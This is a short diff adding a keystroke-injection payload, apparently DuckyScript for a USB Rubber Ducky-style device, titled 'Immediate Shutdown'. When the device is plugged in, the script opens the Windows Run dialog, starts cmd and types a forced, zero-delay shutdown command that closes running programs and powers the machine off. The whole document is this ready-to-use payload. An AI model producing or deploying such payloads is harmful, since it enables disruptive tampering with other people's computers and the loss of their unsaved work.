@@ -1,0 +1,11 @@
+REM Title:      Immediate Shutdown
+REM Developer:  NexusWannaBe
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING shutdown /s /f /t 0
+ENTER
